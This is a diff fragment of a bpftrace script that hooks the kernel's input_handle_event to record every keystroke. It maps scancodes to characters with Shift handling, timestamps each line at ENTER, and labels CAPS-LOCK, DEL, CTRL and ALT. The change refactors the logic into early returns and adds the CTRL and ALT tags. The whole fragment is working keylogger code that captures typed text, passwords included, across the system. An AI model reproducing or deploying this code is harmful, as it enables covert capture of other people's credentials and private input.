@@ -118,55 +118,64 @@ kprobe:input_handle_event
     if ($code == (uint64)(128 + 42) || $code == (uint64)(128 + 54)) {
         // Shift RELEASED [up]
         @is_shift = 0;
-        $code = 0; // RETURN
+        return;
     }
     if ($code == 42 || $code == 54) {
         // Shift PRESSED [down]
         @is_shift = 1;
-        $code = 0; // RETURN
+        return;
     }
     
-    if ($code > 0 && $code < 128) {
-        // Key-Event-UP is >=128
-        if ($code == 28) { // ENTER
-            printf("\n");
-            time("[%F %H:%M:%S] ");
-            $code = 0; // RETURN
-        }
-        if ($code == 0x3a) {
-            printf("[CAPS-LOCK]");
-            $code = 0; // RETURN;
-        }
-        if ($code == 0x0e) {
-            printf("[DEL]");
-            $code = 0; // RETURN;
-        }
+    if ($code <= 1 || $code >= 128) {
         // Ignore 0 and ESC
-        if ($code > 1) {
-            $c = @keys[$code];
-            if (@is_shift == 1) {
-                $close = 1;
-                $SC = @sk[$code];
-                if ($SC > 0) {
-                    $c = $SC;
-                    $close = 0;
-                }
-                if ($c >= 0x41+32 && $c <= 0x5a+32) {
-                    $c -= 32;
-                    $close = 0;
-                }
-                if ($close != 0) {
-                    printf("[SHIFT+");
-                }
-            }
-            if ($c != 0) {
-                printf("%c", $c);
-            } else {
-                printf("[0x%02x]", $code);
-            }
-            if ($close == 1) {
-                printf("]");
-            }
+        // Key-Event-UP is >=128
+        return;
+    }
+
+    if ($code == 28) { // ENTER
+        printf("\n");
+        time("[%F %H:%M:%S] ");
+        return;
+    }
+    if ($code == 0x3a) {
+        printf("[CAPS-LOCK]");
+        return;
+    }
+    if ($code == 0x0e) {
+        printf("[DEL]");
+        return;
+    }
+    if ($code == 0x1d) {
+        printf("[CTRL]");
+        return;
+    }
+    if ($code == 0x38) {
+        printf("[ALT]");
+        return;
+    }
+
+    $c = @keys[$code];
+    if (@is_shift == 1) {
+        $close = 1;
+        $SC = @sk[$code];
+        if ($SC > 0) {
+            $c = $SC;
+            $close = 0;
         }
+        if ($c >= 0x41+32 && $c <= 0x5a+32) {
+            $c -= 32;
+            $close = 0;
+        }
+        if ($close != 0) {
+            printf("[SHIFT+");
+        }
+    }
+    if ($c != 0) {
+        printf("%c", $c);
+    } else {
+        printf("[0x%02x]", $code);
+    }
+    if ($close == 1) {
+        printf("]");
     }
 }
